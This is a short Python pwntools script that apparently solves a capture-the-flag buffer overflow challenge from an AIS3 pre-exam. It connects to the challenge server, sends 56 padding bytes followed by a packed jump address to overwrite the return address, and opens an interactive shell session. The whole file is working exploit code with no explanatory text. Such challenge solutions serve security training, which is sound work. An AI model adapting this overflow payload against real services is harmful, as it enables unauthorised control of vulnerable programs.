# coding=utf-8
from pwn import *

gets = 0x400725
target = 0x400692

stack = 0x7fffffffe440
ret =   0x7fffffffe478
r = remote('pre-exam-pwn.ais3.org', 10000)
# r = process('./bof')

r.recvuntil('challenges')
r.sendline('a'*56 + p32(target))
r.interactive()
